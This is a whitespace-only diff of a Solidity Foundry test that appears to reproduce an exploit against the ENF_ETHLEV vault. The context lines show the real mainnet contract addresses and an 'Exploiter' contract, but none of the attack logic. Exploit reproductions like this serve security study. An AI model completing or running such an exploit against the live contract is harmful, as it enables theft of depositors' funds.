@@ -19,6 +19,7 @@ import "./../interface.sol";
 // Hacking God : https://www.google.com/
 
 interface IENF_ETHLEV is IERC20 {
+
     function deposit(uint256 assets, address receiver) external payable returns (uint256);
 
     function withdraw(uint256 assets, address receiver) external returns (uint256);
@@ -26,9 +27,11 @@ interface IENF_ETHLEV is IERC20 {
     function convertToAssets(uint256 shares) external view returns (uint256);
 
     function totalAssets() external view returns (uint256);
+
 }
 
 contract ContractTest is Test {
+
     IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
     Uni_Pair_V3 Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
     IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);
@@ -78,9 +81,11 @@ contract ContractTest is Test {
             nonce++;
         }
     }
+
 }
 
 contract Exploiter {
+
     IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);
 
     function withdraw() external {
@@ -91,4 +96,5 @@ contract Exploiter {
     }
 
     receive() external payable {}
+
 }
